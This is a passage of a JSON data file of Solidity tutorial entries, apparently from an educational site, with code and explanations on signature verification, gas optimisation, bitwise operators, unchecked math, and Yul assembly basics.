/*\n        Signature is produced by signing a keccak256 hash with the following format:\n        \"\\x19Ethereum Signed Message\\n\" + len(msg) + msg\n        */\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _messageHash)\n        );\n    }\n\n    /* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = \"coffee and donuts\"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function verify(\n        address _signer,\n        address _to,\n        uint256 _amount,\n        string memory _message,\n        uint256 _nonce,\n        bytes memory signature\n    ) public pure returns (bool) {\n        bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(\n        bytes32 _ethSignedMessageHash,\n        bytes memory _signature\n    ) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig)\n        public\n        pure\n        returns (bytes32 r, bytes32 s, uint8 v)\n    {\n        require(sig.length == 65, \"invalid signature length\");\n\n        assembly {\n            /*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */\n\n            // first 32 bytes, after the length prefix\n            r := mload(add(sig, 32))\n            // second 32 bytes\n            s := mload(add(sig, 64))\n            // final byte (first byte of the next 32 bytes)\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        // implicitly return (r, s, v)\n    }\n}\n\n```\n\n### Using Verify Signature in Remix\n\n> **Important Note**: When using Remix to test signature verification, be aware that Remix handles message hashing differently from the contract. Remix will hash the message hash again before creating the ETH signed message hash, while the contract uses the message hash directly. This means the final ETH signed message hash will be different between Remix and the contract:\n>\n> ```solidity\n> // Example with same input parameters:\n> Message hash:    0x56f00a5093efc595178316938b3e9ab51b37610ca57b1b471aa4ce801f05251d\n> Remix output:   0xd3445702e9995d1b351adf2606d88910d12dd95554f0bbdaa8d02061933c6363\n> Contract output: 0xed08430382ce60ae9e2b032b99a36b2c5c5c5a3fa1d293926ce87c723f2fce84\n> ```\n>\n> For proper testing, you may want to use ethers.js or web3.js instead, as shown in the example link above.\n\n1. Get messageHash:\n   - Call `getMessageHash` with these example parameters:\n\n```solidity\naddress _to: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 // which is the second account on Remix\nuint256 _amount: 123\nstring _message: \"coffee and donuts\"\nuint256 _nonce: 1\n```\n\n- Copy the returned messageHash\n\n2. Sign the messageHash:\n   - In \"Deploy & Run Transactions\" tab (which you're supposed to be on already)\n   - Select the first account\n   - Click on the icon after the `+` which is to sign a message, it will open a popup\n   - Paste the messageHash\n   - Click \"Sign\"\n   - Remix returns:\n     - A hash (ethSignedMessageHash)\n     - A signature (you'll need this for verification)\n\n3. Verify the signature:\n   - Call `verify` with:\n\n```solidity\naddress _signer: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4\naddress _to: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2\nuint256 _amount: 123\nstring _message: \"coffee and donuts\"\nuint256 _nonce: 1\nbytes signature: [Signature from step 2]\n```\n\n- Should return `true` if correctly signed",
    "codes": [
      {
        "fileName": "Signature.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/* Signature Verification\n\nHow to Sign and Verify\n# Signing\n1. Create message to sign\n2. Hash the message\n3. Sign the hash (off chain, keep your private key secret)\n\n# Verify\n1. Recreate hash from the original message\n2. Recover signer from signature and hash\n3. Compare recovered signer to claimed signer\n*/\n\ncontract VerifySignature {\n    /* 1. Unlock MetaMask account\n    ethereum.enable()\n    */\n\n    /* 2. Get message hash to sign\n    getMessageHash(\n        0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C,\n        123,\n        \"coffee and donuts\",\n        1\n    )\n\n    hash = \"0xcf36ac4f97dc10d91fc2cbb20d718e94a8cbfe0f82eaedc6a4aa38946fb797cd\"\n    */\n    function getMessageHash(\n        address _to,\n        uint256 _amount,\n        string memory _message,\n        uint256 _nonce\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));\n    }\n\n    /* 3. Sign message hash\n    # using a browser\n    account = \"copy and paste account of signer here\"\n    ethereum.request({ method: \"personal_sign\", params: [account, hash]}).then(console.log)\n\n    # using web3\n    web3.personal.sign(hash, web3.eth.defaultAccount, console.log)\n\n    Signature will be different for different accounts\n    0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function getEthSignedMessageHash(bytes32 _messageHash)\n        public\n        pure\n        returns (bytes32)\n    {\n        /*\n        Signature is produced by signing a keccak256 hash with the following format:\n        \"\\x19Ethereum Signed Message\\n\" + len(msg) + msg\n        */\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _messageHash)\n        );\n    }\n\n    /* 4. Verify signature\n    signer = 0xB273216C05A8c0D4F0a4Dd0d7Bae1D2EfFE636dd\n    to = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C\n    amount = 123\n    message = \"coffee and donuts\"\n    nonce = 1\n    signature =\n        0x993dab3dd91f5c6dc28e17439be475478f5635c92a56e17e82349d3fb2f166196f466c0b4e0c146f285204f0dcb13e5ae67bc33f4b888ec32dfe0a063e8f3f781b\n    */\n    function verify(\n        address _signer,\n        address _to,\n        uint256 _amount,\n        string memory _message,\n        uint256 _nonce,\n        bytes memory signature\n    ) public pure returns (bool) {\n        bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);\n        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);\n\n        return recoverSigner(ethSignedMessageHash, signature) == _signer;\n    }\n\n    function recoverSigner(\n        bytes32 _ethSignedMessageHash,\n        bytes memory _signature\n    ) public pure returns (address) {\n        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);\n\n        return ecrecover(_ethSignedMessageHash, v, r, s);\n    }\n\n    function splitSignature(bytes memory sig)\n        public\n        pure\n        returns (bytes32 r, bytes32 s, uint8 v)\n    {\n        require(sig.length == 65, \"invalid signature length\");\n\n        assembly {\n            /*\n            First 32 bytes stores the length of the signature\n\n            add(sig, 32) = pointer of sig + 32\n            effectively, skips first 32 bytes of signature\n\n            mload(p) loads next 32 bytes starting at the memory address p into memory\n            */\n\n            // first 32 bytes, after the length prefix\n            r := mload(add(sig, 32))\n            // second 32 bytes\n            s := mload(add(sig, 64))\n            // final byte (first byte of the next 32 bytes)\n            v := byte(0, mload(add(sig, 96)))\n        }\n\n        // implicitly return (r, s, v)\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "cryptography",
      "verify",
      "verifying",
      "signature",
      "signatures",
      "ecrecover"
    ],
    "order": 44
  },
  {
    "slug": "gas-golf",
    "title": "Gas Saving Techniques",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Some gas saving techniques",
    "content": "Some gas saving techniques.\n\n- Replacing `memory` with `calldata`\n- Loading state variables to memory\n- Replace for loop `i++` with `++i`\n- Caching array elements\n- Short circuit\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// gas golf\ncontract GasGolf {\n    // start - 50908 gas\n    // use calldata - 49163 gas\n    // load state variables to memory - 48952 gas\n    // short circuit - 48634 gas\n    // loop increments - 48244 gas\n    // cache array length - 48209 gas\n    // load array elements to memory - 48047 gas\n    // uncheck i overflow/underflow - 47309 gas\n\n    uint256 public total;\n\n    // start - not gas optimized\n    // function sumIfEvenAndLessThan99(uint[] memory nums) external {\n    //     for (uint i = 0; i < nums.length; i += 1) {\n    //         bool isEven = nums[i] % 2 == 0;\n    //         bool isLessThan99 = nums[i] < 99;\n    //         if (isEven && isLessThan99) {\n    //             total += nums[i];\n    //         }\n    //     }\n    // }\n\n    // gas optimized\n    // [1, 2, 3, 4, 5, 100]\n    function sumIfEvenAndLessThan99(uint256[] calldata nums) external {\n        uint256 _total = total;\n        uint256 len = nums.length;\n\n        for (uint256 i = 0; i < len;) {\n            uint256 num = nums[i];\n            if (num % 2 == 0 && num < 99) {\n                _total += num;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n\n        total = _total;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "GasGolf.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// gas golf\ncontract GasGolf {\n    // start - 50908 gas\n    // use calldata - 49163 gas\n    // load state variables to memory - 48952 gas\n    // short circuit - 48634 gas\n    // loop increments - 48244 gas\n    // cache array length - 48209 gas\n    // load array elements to memory - 48047 gas\n    // uncheck i overflow/underflow - 47309 gas\n\n    uint256 public total;\n\n    // start - not gas optimized\n    // function sumIfEvenAndLessThan99(uint[] memory nums) external {\n    //     for (uint i = 0; i < nums.length; i += 1) {\n    //         bool isEven = nums[i] % 2 == 0;\n    //         bool isLessThan99 = nums[i] < 99;\n    //         if (isEven && isLessThan99) {\n    //             total += nums[i];\n    //         }\n    //     }\n    // }\n\n    // gas optimized\n    // [1, 2, 3, 4, 5, 100]\n    function sumIfEvenAndLessThan99(uint256[] calldata nums) external {\n        uint256 _total = total;\n        uint256 len = nums.length;\n\n        for (uint256 i = 0; i < len;) {\n            uint256 num = nums[i];\n            if (num % 2 == 0 && num < 99) {\n                _total += num;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n\n        total = _total;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "gas",
      "golf"
    ],
    "order": 45
  },
  {
    "slug": "bitwise",
    "title": "Bitwise Operators",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Learn about bitwise operators in Solidity",
    "content": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract BitwiseOps {\n    // x     = 1110 = 8 + 4 + 2 + 0 = 14\n    // y     = 1011 = 8 + 0 + 2 + 1 = 11\n    // x & y = 1010 = 8 + 0 + 2 + 0 = 10\n    function and(uint256 x, uint256 y) external pure returns (uint256) {\n        return x & y;\n    }\n\n    // x     = 1100 = 8 + 4 + 0 + 0 = 12\n    // y     = 1001 = 8 + 0 + 0 + 1 = 9\n    // x | y = 1101 = 8 + 4 + 0 + 1 = 13\n    function or(uint256 x, uint256 y) external pure returns (uint256) {\n        return x | y;\n    }\n\n    // x     = 1100 = 8 + 4 + 0 + 0 = 12\n    // y     = 0101 = 0 + 4 + 0 + 1 = 5\n    // x ^ y = 1001 = 8 + 0 + 0 + 1 = 9\n    function xor(uint256 x, uint256 y) external pure returns (uint256) {\n        return x ^ y;\n    }\n\n    // x  = 00001100 =   0 +  0 +  0 +  0 + 8 + 4 + 0 + 0 = 12\n    // ~x = 11110011 = 128 + 64 + 32 + 16 + 0 + 0 + 2 + 1 = 243\n    function not(uint8 x) external pure returns (uint8) {\n        return ~x;\n    }\n\n    // 1 << 0 = 0001 --> 0001 = 1\n    // 1 << 1 = 0001 --> 0010 = 2\n    // 1 << 2 = 0001 --> 0100 = 4\n    // 1 << 3 = 0001 --> 1000 = 8\n    // 3 << 2 = 0011 --> 1100 = 12\n    function shiftLeft(uint256 x, uint256 bits)\n        external\n        pure\n        returns (uint256)\n    {\n        return x << bits;\n    }\n\n    // 8  >> 0 = 1000 --> 1000 = 8\n    // 8  >> 1 = 1000 --> 0100 = 4\n    // 8  >> 2 = 1000 --> 0010 = 2\n    // 8  >> 3 = 1000 --> 0001 = 1\n    // 8  >> 4 = 1000 --> 0000 = 0\n    // 12 >> 1 = 1100 --> 0110 = 6\n    function shiftRight(uint256 x, uint256 bits)\n        external\n        pure\n        returns (uint256)\n    {\n        return x >> bits;\n    }\n\n    // Get last n bits from x\n    function getLastNBits(uint256 x, uint256 n)\n        external\n        pure\n        returns (uint256)\n    {\n        // Example, last 3 bits\n        // x        = 1101 = 13\n        // mask     = 0111 = 7\n        // x & mask = 0101 = 5\n        uint256 mask = (1 << n) - 1;\n        return x & mask;\n    }\n\n    // Get last n bits from x using mod operator\n    function getLastNBitsUsingMod(uint256 x, uint256 n)\n        external\n        pure\n        returns (uint256)\n    {\n        // 1 << n = 2 ** n\n        return x % (1 << n);\n    }\n\n    // Get position of most significant bit\n    // x = 1100 = 12, most significant bit = 1000, so this function will return 3\n    function mostSignificantBit(uint256 x) external pure returns (uint256) {\n        uint256 i = 0;\n        while ((x >>= 1) > 0) {\n            ++i;\n        }\n        return i;\n    }\n\n    // Get first n bits from x\n    // len = length of bits in x = position of most significant bit of x, + 1\n    function getFirstNBits(uint256 x, uint256 n, uint256 len)\n        external\n        pure\n        returns (uint256)\n    {\n        // Example\n        // x        = 1110 = 14, n = 2, len = 4\n        // mask     = 1100 = 12\n        // x & mask = 1100 = 12\n        uint256 mask = ((1 << n) - 1) << (len - n);\n        return x & mask;\n    }\n}\n\n```\n\n### Most significant bit\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MostSignificantBitFunction {\n    // Find most significant bit using binary search\n    function mostSignificantBit(uint256 x)\n        external\n        pure\n        returns (uint256 msb)\n    {\n        // x >= 2 ** 128\n        if (x >= 0x100000000000000000000000000000000) {\n            x >>= 128;\n            msb += 128;\n        }\n        // x >= 2 ** 64\n        if (x >= 0x10000000000000000) {\n            x >>= 64;\n            msb += 64;\n        }\n        // x >= 2 ** 32\n        if (x >= 0x100000000) {\n            x >>= 32;\n            msb += 32;\n        }\n        // x >= 2 ** 16\n        if (x >= 0x10000) {\n            x >>= 16;\n            msb += 16;\n        }\n        // x >= 2 ** 8\n        if (x >= 0x100) {\n            x >>= 8;\n            msb += 8;\n        }\n        // x >= 2 ** 4\n        if (x >= 0x10) {\n            x >>= 4;\n            msb += 4;\n        }\n        // x >= 2 ** 2\n        if (x >= 0x4) {\n            x >>= 2;\n            msb += 2;\n        }\n        // x >= 2 ** 1\n        if (x >= 0x2) msb += 1;\n    }\n}\n\n```\n\n### Most significant bit in assembly\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MostSignificantBitAssembly {\n    function mostSignificantBit(uint256 x)\n        external\n        pure\n        returns (uint256 msb)\n    {\n        assembly {\n            let f := shl(7, gt(x, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))\n            x := shr(f, x)\n            // or can be replaced with add\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(6, gt(x, 0xFFFFFFFFFFFFFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(5, gt(x, 0xFFFFFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(4, gt(x, 0xFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(3, gt(x, 0xFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(2, gt(x, 0xF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(1, gt(x, 0x3))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := gt(x, 0x1)\n            msb := or(msb, f)\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Bitwise.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract BitwiseOps {\n    // x     = 1110 = 8 + 4 + 2 + 0 = 14\n    // y     = 1011 = 8 + 0 + 2 + 1 = 11\n    // x & y = 1010 = 8 + 0 + 2 + 0 = 10\n    function and(uint256 x, uint256 y) external pure returns (uint256) {\n        return x & y;\n    }\n\n    // x     = 1100 = 8 + 4 + 0 + 0 = 12\n    // y     = 1001 = 8 + 0 + 0 + 1 = 9\n    // x | y = 1101 = 8 + 4 + 0 + 1 = 13\n    function or(uint256 x, uint256 y) external pure returns (uint256) {\n        return x | y;\n    }\n\n    // x     = 1100 = 8 + 4 + 0 + 0 = 12\n    // y     = 0101 = 0 + 4 + 0 + 1 = 5\n    // x ^ y = 1001 = 8 + 0 + 0 + 1 = 9\n    function xor(uint256 x, uint256 y) external pure returns (uint256) {\n        return x ^ y;\n    }\n\n    // x  = 00001100 =   0 +  0 +  0 +  0 + 8 + 4 + 0 + 0 = 12\n    // ~x = 11110011 = 128 + 64 + 32 + 16 + 0 + 0 + 2 + 1 = 243\n    function not(uint8 x) external pure returns (uint8) {\n        return ~x;\n    }\n\n    // 1 << 0 = 0001 --> 0001 = 1\n    // 1 << 1 = 0001 --> 0010 = 2\n    // 1 << 2 = 0001 --> 0100 = 4\n    // 1 << 3 = 0001 --> 1000 = 8\n    // 3 << 2 = 0011 --> 1100 = 12\n    function shiftLeft(uint256 x, uint256 bits)\n        external\n        pure\n        returns (uint256)\n    {\n        return x << bits;\n    }\n\n    // 8  >> 0 = 1000 --> 1000 = 8\n    // 8  >> 1 = 1000 --> 0100 = 4\n    // 8  >> 2 = 1000 --> 0010 = 2\n    // 8  >> 3 = 1000 --> 0001 = 1\n    // 8  >> 4 = 1000 --> 0000 = 0\n    // 12 >> 1 = 1100 --> 0110 = 6\n    function shiftRight(uint256 x, uint256 bits)\n        external\n        pure\n        returns (uint256)\n    {\n        return x >> bits;\n    }\n\n    // Get last n bits from x\n    function getLastNBits(uint256 x, uint256 n)\n        external\n        pure\n        returns (uint256)\n    {\n        // Example, last 3 bits\n        // x        = 1101 = 13\n        // mask     = 0111 = 7\n        // x & mask = 0101 = 5\n        uint256 mask = (1 << n) - 1;\n        return x & mask;\n    }\n\n    // Get last n bits from x using mod operator\n    function getLastNBitsUsingMod(uint256 x, uint256 n)\n        external\n        pure\n        returns (uint256)\n    {\n        // 1 << n = 2 ** n\n        return x % (1 << n);\n    }\n\n    // Get position of most significant bit\n    // x = 1100 = 12, most significant bit = 1000, so this function will return 3\n    function mostSignificantBit(uint256 x) external pure returns (uint256) {\n        uint256 i = 0;\n        while ((x >>= 1) > 0) {\n            ++i;\n        }\n        return i;\n    }\n\n    // Get first n bits from x\n    // len = length of bits in x = position of most significant bit of x, + 1\n    function getFirstNBits(uint256 x, uint256 n, uint256 len)\n        external\n        pure\n        returns (uint256)\n    {\n        // Example\n        // x        = 1110 = 14, n = 2, len = 4\n        // mask     = 1100 = 12\n        // x & mask = 1100 = 12\n        uint256 mask = ((1 << n) - 1) << (len - n);\n        return x & mask;\n    }\n}\n"
      },
      {
        "fileName": "MostSignificantBitAssembly.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MostSignificantBitAssembly {\n    function mostSignificantBit(uint256 x)\n        external\n        pure\n        returns (uint256 msb)\n    {\n        assembly {\n            let f := shl(7, gt(x, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))\n            x := shr(f, x)\n            // or can be replaced with add\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(6, gt(x, 0xFFFFFFFFFFFFFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(5, gt(x, 0xFFFFFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(4, gt(x, 0xFFFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(3, gt(x, 0xFF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(2, gt(x, 0xF))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := shl(1, gt(x, 0x3))\n            x := shr(f, x)\n            msb := or(msb, f)\n        }\n        assembly {\n            let f := gt(x, 0x1)\n            msb := or(msb, f)\n        }\n    }\n}\n"
      },
      {
        "fileName": "MostSignificantBitFunction.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MostSignificantBitFunction {\n    // Find most significant bit using binary search\n    function mostSignificantBit(uint256 x)\n        external\n        pure\n        returns (uint256 msb)\n    {\n        // x >= 2 ** 128\n        if (x >= 0x100000000000000000000000000000000) {\n            x >>= 128;\n            msb += 128;\n        }\n        // x >= 2 ** 64\n        if (x >= 0x10000000000000000) {\n            x >>= 64;\n            msb += 64;\n        }\n        // x >= 2 ** 32\n        if (x >= 0x100000000) {\n            x >>= 32;\n            msb += 32;\n        }\n        // x >= 2 ** 16\n        if (x >= 0x10000) {\n            x >>= 16;\n            msb += 16;\n        }\n        // x >= 2 ** 8\n        if (x >= 0x100) {\n            x >>= 8;\n            msb += 8;\n        }\n        // x >= 2 ** 4\n        if (x >= 0x10) {\n            x >>= 4;\n            msb += 4;\n        }\n        // x >= 2 ** 2\n        if (x >= 0x4) {\n            x >>= 2;\n            msb += 2;\n        }\n        // x >= 2 ** 1\n        if (x >= 0x2) msb += 1;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "bitwise",
      "most",
      "significant",
      "bit",
      "assembly"
    ],
    "order": 46
  },
  {
    "slug": "unchecked-math",
    "title": "Unchecked Math",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "An example of unchecked math in Solidity",
    "content": "Overflow and underflow of numbers in Solidity 0.8 throw an error. This can be disabled by using `unchecked`.\n\nDisabling overflow / underflow check saves gas.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UncheckedMath {\n    function add(uint256 x, uint256 y) external pure returns (uint256) {\n        // 22291 gas\n        // return x + y;\n\n        // 22103 gas\n        unchecked {\n            return x + y;\n        }\n    }\n\n    function sub(uint256 x, uint256 y) external pure returns (uint256) {\n        // 22329 gas\n        // return x - y;\n\n        // 22147 gas\n        unchecked {\n            return x - y;\n        }\n    }\n\n    function sumOfCubes(uint256 x, uint256 y) external pure returns (uint256) {\n        // Wrap complex math logic inside unchecked\n        unchecked {\n            uint256 x3 = x * x * x;\n            uint256 y3 = y * y * y;\n\n            return x3 + y3;\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "UncheckedMath.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract UncheckedMath {\n    function add(uint256 x, uint256 y) external pure returns (uint256) {\n        // 22291 gas\n        // return x + y;\n\n        // 22103 gas\n        unchecked {\n            return x + y;\n        }\n    }\n\n    function sub(uint256 x, uint256 y) external pure returns (uint256) {\n        // 22329 gas\n        // return x - y;\n\n        // 22147 gas\n        unchecked {\n            return x - y;\n        }\n    }\n\n    function sumOfCubes(uint256 x, uint256 y) external pure returns (uint256) {\n        // Wrap complex math logic inside unchecked\n        unchecked {\n            uint256 x3 = x * x * x;\n            uint256 y3 = y * y * y;\n\n            return x3 + y3;\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "gas",
      "unchecked",
      "math",
      "overflow",
      "underflow"
    ],
    "order": 47
  },
  {
    "slug": "assembly-variable",
    "title": "Assembly Variable",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of how to declare variable inside assembly",
    "content": "Example of how to declare variables inside `assembly`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyVariable {\n    function yul_let() public pure returns (uint256 z) {\n        assembly {\n            // The language used for assembly is called Yul\n            // Local variables\n            let x := 123\n            z := 456\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyVariable.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyVariable {\n    function yul_let() public pure returns (uint256 z) {\n        assembly {\n            // The language used for assembly is called Yul\n            // Local variables\n            let x := 123\n            z := 456\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "variable",
      "yul"
    ],
    "order": 48
  },
  {
    "slug": "assembly-if",
    "title": "Assembly Conditional Statements",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of conditional statements in assembly",
    "content": "Example of conditional statements in `assembly`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyIf {\n    function yul_if(uint256 x) public pure returns (uint256 z) {\n        assembly {\n            // if condition = 1 { code }\n            // no else\n            // if 0 { z := 99 }\n            // if 1 { z := 99 }\n            if lt(x, 10) { z := 99 }\n        }\n    }\n\n    function yul_switch(uint256 x) public pure returns (uint256 z) {\n        assembly {\n            switch x\n            case 1 { z := 10 }\n            case 2 { z := 20 }\n            default { z := 0 }\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyIf.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyIf {\n    function yul_if(uint256 x) public pure returns (uint256 z) {\n        assembly {\n            // if condition = 1 { code }\n            // no else\n            // if 0 { z := 99 }\n            // if 1 { z := 99 }\n            if lt(x, 10) { z := 99 }\n        }\n    }\n\n    function yul_switch(uint256 x) public pure returns (uint256 z) {\n        assembly {\n            switch x\n            case 1 { z := 10 }\n            case 2 { z := 20 }\n            default { z := 0 }\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "yul",
      "if",
      "switch"
    ],
    "order": 49
  },
  {
    "slug": "assembly-loop",
    "title": "Assembly Loop",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of loop in assembly",
    "content": "Example of loop in assembly\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyLoop {\n    function yul_for_loop() public pure returns (uint256 z) {\n        assembly {\n            for { let i := 0 } lt(i, 10) { i := add(i, 1) } { z := add(z, 1) }\n        }\n    }\n\n    function yul_while_loop() public pure returns (uint256 z) {\n        assembly {\n            let i := 0\n            for {} lt(i, 5) {} {\n                i := add(i, 1)\n                z := add(z, 1)\n            }\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyLoop.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyLoop {\n    function yul_for_loop() public pure returns (uint256 z) {\n        assembly {\n            for { let i := 0 } lt(i, 10) { i := add(i, 1) } { z := add(z, 1) }\n        }\n    }\n\n    function yul_while_loop() public pure returns (uint256 z) {\n        assembly {\n            let i := 0\n            for {} lt(i, 5) {} {\n                i := add(i, 1)\n                z := add(z, 1)\n            }\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "loop",
      "yul",
      "while",
      "for"
    ],
    "order": 50
  },
  {
    "slug": "assembly-error",
    "title": "Assembly Error",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of error in assembly",
    "content": "Example of error in `assembly`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyError {\n    function yul_revert(uint256 x) public pure {\n        assembly {\n            // revert(p, s) - end execution\n            //                revert state changes\n            //                return data mem[p…(p+s))\n            if gt(x, 10) { revert(0, 0) }\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyError.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyError {\n    function yul_revert(uint256 x) public pure {\n        assembly {\n            // revert(p, s) - end execution\n            //                revert state changes\n            //                return data mem[p…(p+s))\n            if gt(x, 10) { revert(0, 0) }\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "yul",
      "error",
      "revert"
    ],
    "order": 51
  },
  {
    "slug": "assembly-math",
    "title": "Assembly Math",
    "category": "Basic",
    "categorySlug": "basic",
    "description": "Example of math in assembly",
    "content": "Example of math in `assembly`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyMath {\n    function yul_add(uint256 x, uint256 y) public pure returns (uint256 z) {\n        assembly {\n            z := add(x, y)\n            if lt(z, x) { revert(0, 0) }\n        }\n    }\n\n    function yul_mul(uint256 x, uint256 y) public pure returns (uint256 z) {\n        assembly {\n            switch x\n            case 0 { z := 0 }\n            default {\n                z := mul(x, y)\n                if iszero(eq(div(z, x), y)) { revert(0, 0) }\n            }\n        }\n    }\n\n    // Round to nearest multiple of b\n    function yul_fixed_point_round(uint256 x, uint256 b)\n        public\n        pure\n        returns (uint256 z)\n    {\n        assembly {\n            // b = 100\n            // x = 90\n            // z = 90 / 100 * 100 = 0, want z = 100\n            // z := mul(div(x, b), b)\n\n            let half := div(b, 2)\n            z := add(x, half)\n            z := mul(div(z, b), b)\n            // x = 90\n            // half = 50\n            // z = 90 + 50 = 140\n            // z = 140 / 100 * 100 = 100\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyMath.sol",
